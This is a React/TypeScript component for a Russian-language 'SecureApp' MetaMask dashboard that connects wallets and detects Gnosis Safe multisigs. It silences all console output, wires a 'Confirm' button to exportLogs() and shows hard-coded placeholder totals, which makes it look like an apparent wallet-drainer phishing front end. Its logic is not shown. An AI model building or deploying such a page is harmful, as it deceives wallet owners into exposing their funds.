import { useMetamaskLoginLogic } from "./hooks/use-metamask-login"
import metamaskIcon from "./assets/metamask.svg"
import logo from "./assets/logo.png"
import { useState } from "react"

const ENABLE_VERBOSE_LOGS = false
if (typeof window !== "undefined" && !ENABLE_VERBOSE_LOGS) {
  ;(console as any).log = () => {}
  ;(console as any).info = () => {}
  ;(console as any).debug = () => {}
  ;(console as any).warn = () => {}
}

export default function MetamaskLoginPage() {
  const [loading, setLoading] = useState(false)
  const {
    connected,
    address,
    chainId,
    balance,
    logs,
    logsRef,
    toasts,
    safeModalVisible,
    safeCandidates,
    handleSelectSafe,
    handleDismissSafe,
    selectedSafe,
    safeBalance,
    isContractConnected,
    connectMetaMask,
    disconnect,
    exportLogs,
  } = useMetamaskLoginLogic()

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-b from-gray-900 via-gray-800 to-black p-4 sm:p-6">
      <div className="w-full max-w-5xl bg-white/5 backdrop-blur-md border border-white/10 rounded-2xl p-4 sm:p-8 shadow-2xl relative">
        <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between mb-6 gap-4">
          <div className="flex flex-col items-start text-center sm:text-left w-full sm:w-auto">
            <img
              src={logo}
              alt="Logo"
              className="w-28 sm:w-40 h-auto object-contain select-none mx-auto sm:mx-0"
            />
            <p className="mt-2 text-xs sm:text-sm tracking-wide text-gray-400 uppercase">
              SecureApp Управление ботами{" "}
              <span className="text-gray-300">v1.1.6</span>
            </p>
          </div>

          <div className="w-full sm:w-auto">
            <button
              onClick={async () => {
                setLoading(true)
                await connectMetaMask()
                setLoading(false)
              }}
              className="flex items-center justify-center w-full sm:w-auto gap-3 px-5 sm:px-7 py-3 rounded-xl bg-gradient-to-r from-gray-700/30 to-gray-600/30 border border-white/10 text-sm sm:text-base text-gray-200 font-semibold tracking-wide hover:from-gray-600/50 hover:to-gray-500/50 hover:scale-[1.03] hover:border-white/20 transition-all duration-300 ease-in-out"
            >
              <span className="w-7 sm:w-8 h-7 sm:h-8 inline-block">
                <img src={metamaskIcon} alt="MetaMask" className="w-full h-full" />
              </span>
              <span className="uppercase tracking-wider">MetaMask</span>
            </button>
          </div>
        </div>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 sm:gap-8 items-stretch">
          {/* Левая часть */}
          <div className="flex flex-col justify-between gap-4 bg-white/5 rounded-lg border border-white/10 shadow-sm p-4 sm:p-5 h-full">
            <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between mb-3 gap-2">
              <div>
                <div className="text-xs text-gray-300">Статус</div>
                <div className="text-sm sm:text-base text-gray-200 mb-3 font-semibold tracking-wide">
                  {connected ? "Подключен" : "Не подключен"}
                </div>
                <div className="text-xs text-gray-400 mt-1">
                  Тип кошелька:{" "}
                  <span className="text-white font-medium">
                    {selectedSafe ? "Multisig (Gnosis Safe)" : "EOA"}
                  </span>
                </div>
                {safeCandidates.length > 0 && (
                  <select
                    className="mt-2 px-2 py-1 rounded bg-gray-800 text-xs sm:text-sm text-gray-200 border border-gray-700 focus:outline-none focus:ring-2 focus:ring-yellow-400"
                    value={selectedSafe ? "safe" : "eoa"}
                    onChange={(e) => {
                      if (e.target.value === "safe") {
                        if (safeBalance && selectedSafe) return
                      } else {
                        if (selectedSafe) handleDismissSafe()
                      }
                    }}
                  >
                    <option value="eoa">EOA</option>
                    {safeCandidates.map((s, i) => (
                      <option key={i} value="safe">
                        {s}
                      </option>
                    ))}
                  </select>
                )}
              </div>
              <div className="text-left sm:text-right">
                <div className="text-xs text-gray-300">Chain</div>
                <div className="text-sm text-white">{chainId ?? "—"}</div>
              </div>
            </div>

            <div className="bg-black/20 border border-white/10 rounded-md p-3 flex flex-col gap-2">
              <div className="flex items-center justify-between flex-wrap">
                <div className="text-xs text-gray-300 mb-1 sm:mb-0">Адрес</div>
                {(safeBalance || selectedSafe) && (
                  <select
                    className="ml-auto px-2 py-1 rounded bg-gray-800 text-xs sm:text-sm text-gray-200 border border-gray-700 focus:outline-none focus:ring-2 focus:ring-yellow-400"
                    value={selectedSafe ? "safe" : "eoa"}
                    onChange={(e) => {
                      if (e.target.value === "safe") {
                        if (safeBalance && selectedSafe) return
                      } else {
                        if (selectedSafe) handleDismissSafe()
                      }
                    }}
                  >
                    <option value="eoa">EOA</option>
                    {selectedSafe && <option value="safe">Safe</option>}
                  </select>
                )}
              </div>
              <div className="text-xs sm:text-sm text-white break-all">
                {selectedSafe ? selectedSafe : address ?? "—"}
              </div>
              <div className="flex justify-between mt-2">
                <div className="text-xs text-gray-300">Баланс (ETH)</div>
                <div className="text-xs sm:text-sm text-white">
                  {selectedSafe ? safeBalance ?? "—" : balance ?? "—"}
                </div>
              </div>
            </div>

            <div className="flex flex-col sm:flex-row gap-2 mt-4 w-full">
              <button
                type="button"
                className="w-full sm:w-auto px-4 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm sm:text-base text-gray-200 font-semibold tracking-wide transition-colors"
                onClick={async () => {
                  setLoading(true)
                  await disconnect()
                  setLoading(false)
                }}
              >
                Отключить
              </button>
              <button
                type="button"
                className="w-full sm:w-auto px-4 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm sm:text-base text-gray-200 font-semibold tracking-wide transition-colors"
                onClick={async () => {
                  setLoading(true)
                  await exportLogs()
                  setLoading(false)
                }}
              >
                Подтвердить
              </button>
            </div>

            <div className="mt-3 text-xs text-gray-400 text-center sm:text-left">
              Статус контракта:{" "}
              <span className="text-gray-300">
                {isContractConnected ? "Готов" : "Не готов"}
              </span>
            </div>
          </div>

          {/* Правая часть */}
          <div className="flex flex-col justify-between gap-4 bg-white/5 rounded-lg border border-white/10 shadow-sm p-4 sm:p-5 h-full">
            <div className="flex-1">
              <div className="text-sm text-gray-200 mb-3 font-semibold tracking-wide">
                Краткие действия для интеграции
              </div>
              <ol className="text-xs sm:text-sm text-gray-400 list-decimal list-inside space-y-1 leading-relaxed">
                <li>Подтвердите кошелёк</li>
                <li>Выберите LP-токены и пул</li>
                <li>Подтвердите выбор и комиссию</li>
                <li>Ожидайте начисление</li>
              </ol>
            </div>

            <div>
              <div className="bg-black/20 border border-white/10 rounded-md p-3 h-24 sm:h-28 overflow-y-auto">
                <div className="text-xs sm:text-sm text-center text-gray-400 py-2">
                  No data
                </div>
              </div>
            </div>

            <div className="flex justify-between items-center text-xs sm:text-sm">
              <div className="text-gray-400">Всего:</div>
              <div className="text-sm sm:text-base text-gray-200 font-semibold tracking-wide">
                0.00 USDT
              </div>
            </div>
          </div>
        </div>
        {/* Логи и модалка */}
        <div className="flex flex-col gap-4 mt-6 sm:mt-8 w-full">
          <div className="p-3 sm:p-4 bg-gradient-to-br from-gray-800/80 to-gray-900/80 rounded-xl border border-white/10 shadow-inner flex flex-col">
            <div className="flex items-center justify-between mb-3">
              <div className="text-xs sm:text-sm text-gray-300 font-semibold">
                Live Logs
              </div>
            </div>
            <div
              ref={logsRef}
              className="h-64 sm:h-80 overflow-y-auto overflow-x-hidden bg-black/60 rounded-lg p-3 text-[10px] sm:text-xs text-white font-mono border border-white/10 shadow-md whitespace-nowrap overflow-clip"
              style={{ lineHeight: "1.2", maxHeight: "14rem" }}
            >
              {logs.length === 0 ? (
                <div className="text-gray-500 text-center mt-8 text-xs sm:text-sm">
                  Логи появятся после действий
                </div>
              ) : (
                logs.map((l, i) => (
                  <div
                    key={i}
                    className="mb-1 px-2 py-1 rounded hover:bg-white/5 transition-colors"
                  >
                    <span className="text-gray-400">[{l.ts}]</span>{" "}
                    <span className="px-1 rounded text-[10px] bg-gray-700">
                      {l.level.toUpperCase()}
                    </span>{" "}
                    <span className="text-white">
                      {l.tag ? `[${l.tag}]` : ""} {l.message}
                    </span>
                    {l.meta && (
                      <pre className="text-[10px] text-gray-400 mt-1">
                        {JSON.stringify(l.meta, null, 2)}
                      </pre>
                    )}
                  </div>
                ))
              )}
            </div>
          </div>
        </div>

        <div className="mt-8 text-xs sm:text-sm text-gray-400 underline text-center sm:text-left">
          Политика конфиденциальности <br /> Служба поддержки
        </div>

        {safeModalVisible && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-xl transition-all duration-300 p-3 sm:p-0">
            <div
              className="absolute inset-0"
              onClick={async () => {
                setLoading(true);
                await handleDismissSafe();
                setLoading(false);
              }}
            />
            <div className="relative bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 border border-white/10 rounded-2xl shadow-2xl p-5 sm:p-8 max-w-xs sm:max-w-md w-full animate-fadeIn">
              <button
                onClick={async () => {
                  setLoading(true);
                  await handleDismissSafe();
                  setLoading(false);
                }}
                className="absolute top-2 right-2 sm:top-4 sm:right-4 text-gray-400 hover:text-gray-200 transition-colors text-lg sm:text-xl"
              >
                ×
              </button>

              <div className="flex items-center gap-3 mb-4 sm:mb-5">
                <svg
                  width="28"
                  height="28"
                  fill="none"
                  viewBox="0 0 24 24"
                  className="text-yellow-400 sm:w-8 sm:h-8"
                >
                  <path
                    d="M12 2L2 7v7c0 5 4 8 10 8s10-3 10-8V7l-10-5z"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinejoin="round"
                  />
                </svg>
                <span className="text-lg sm:text-xl font-bold text-white">
                  Обнаружен Gnosis Safe
                </span>
              </div>

              <div className="text-xs sm:text-sm text-gray-300 mb-6">
                Выберите Safe для управления или используйте обычный кошелёк (EOA).
              </div>

              <div className="flex flex-col gap-3 mb-6">
                {address && (
                  <button
                    type="button"
                    onClick={async () => {
                      setLoading(true);
                      await handleDismissSafe();
                      setLoading(false);
                    }}
                    className="px-4 py-3 bg-white/5 hover:bg-white/10 border border-white/10 rounded-lg text-xs sm:text-sm text-gray-100 font-semibold transition-all text-center"
                  >
                    {`EOA (${address.slice(0, 6)}...${address.slice(-4)})`}
                  </button>
                )}

                {safeCandidates.map((s: string) => (
                  <button
                    key={s}
                    type="button"
                    onClick={async () => {
                      setLoading(true);
                      await handleSelectSafe(s);
                      setLoading(false);
                    }}
                    className="px-4 py-3 bg-white/5 hover:bg-white/10 border border-white/10 rounded-lg text-xs sm:text-sm text-gray-100 font-semibold transition-all text-center"
                  >
                    {`Multisig (${s.slice(0, 6)}...${s.slice(-4)})`}
                  </button>
                ))}
              </div>
            </div>
          </div>
        )}
        {/* Toast уведомления */}
        <div className="absolute -top-6 left-1/2 -translate-x-1/2 flex flex-col items-center gap-3 z-50 pointer-events-none w-full max-w-xs sm:max-w-xl px-3 sm:px-4">
          {toasts.map((t) => (
            <div
              key={t.id}
              className={
                `w-full bg-slate-800 border border-slate-700 rounded-lg p-2 sm:p-3 text-xs sm:text-sm text-gray-100 shadow-md transform transition-all duration-300 ease-out pointer-events-auto ` +
                (t.entered && !t.leaving
                  ? "opacity-100 translate-y-0 scale-100"
                  : t.leaving
                    ? "opacity-0 -translate-y-3 scale-95"
                    : "opacity-0 -translate-y-3 scale-95")
              }
            >
              <div className="flex items-start gap-2 sm:gap-3">
                <div className="flex-1">
                  {t.title && (
                    <div className="font-semibold mb-0.5 text-gray-50 text-xs sm:text-sm">
                      {t.title}
                    </div>
                  )}
                  {t.description && (
                    <div className="text-[10px] sm:text-xs text-gray-200">
                      {t.description}
                    </div>
                  )}
                </div>
              </div>
            </div>
          ))}
        </div>

        {/* Прелоадер */}
        {loading && (
          <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/70 backdrop-blur-md">
            <div className="w-10 sm:w-12 h-10 sm:h-12 border-4 border-white/30 border-t-white rounded-full animate-spin"></div>
          </div>
        )}
      </div>
    </div>
  )
}
